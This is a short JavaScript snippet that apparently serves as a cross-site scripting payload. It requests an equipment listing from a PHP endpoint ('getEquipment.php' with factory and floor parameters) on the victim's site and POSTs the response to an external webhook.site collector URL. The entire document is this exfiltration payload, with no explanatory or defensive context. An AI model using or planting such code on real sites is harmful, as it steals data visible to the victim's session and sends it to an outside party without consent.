fetch('getEquipment.php?usine=814&etage=1')
  .then(r => r.text())
  .then(d => fetch('https://webhook.site/a2e6bdea-4569-4394-821d-ee8a0efd5f41', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: d
  }));
